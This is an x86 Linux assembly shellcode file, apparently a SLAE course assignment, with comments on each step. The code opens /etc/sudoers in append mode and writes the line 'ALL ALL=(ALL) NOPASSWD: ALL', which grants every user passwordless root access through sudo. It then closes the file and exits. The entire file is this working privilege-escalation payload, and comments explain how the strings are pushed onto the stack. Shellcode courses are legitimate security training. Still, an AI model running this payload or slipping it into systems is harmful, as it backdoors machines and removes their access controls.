; Author: John Stigerwalt
; SLAE: Assignment #6
; Shellcode: Orginal Version - Sudo with root access no pass
;

section .text

global _start

_start:

	;open("/etc/sudoers", O_WRONLY | O_APPEND);
	xor eax, eax
	push eax               ; push null to stack
	push 0x7372656f        ; /etc/sudoers
	push 0x6475732f
	push 0x6374652f
	mov ebx, esp           ; set /etc/sudoers to ebx - 2nd arg for open
	mov cx, 0x401 ;        ; file access bits 0x401: 400 = APPEND | 01 = WRONLY
	mov al, 0x05           ; sys_call open - 0x5 - 1st arg for open
	int 0x80

	mov ebx, eax           ; file descriptor returned from open sys_call - 2nd arg of write 

	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
	xor eax, eax
	push eax               ; Null out stack for push dword method
	push 0x0a4c4c41        ; ALL ALL=(ALL) NOPASSWD: ALL
	push 0x203a4457        
	push 0x53534150
	push 0x4f4e2029
	push 0x4c4c4128
	push 0x3d4c4c41
	push 0x204c4c41
	mov ecx, esp           ;move ALL ALL=(ALL) NOPASSWD: ALL from stack to ecx - 3rd arg
	mov dl, 0x1c           ; 0x1c = 28, max characters to write to file - 4th arg
	mov al, 0x04           ; 0x04 syscall write - 1st arg
	int 0x80

	;close(file)
	mov al, 0x06           ; 0x06 syscall - close file
	int 0x80

	;exit(0);
	xor ebx, ebx
	mov al, 0x01           ; 0x01 syscall exit - exit process
	int 0x80
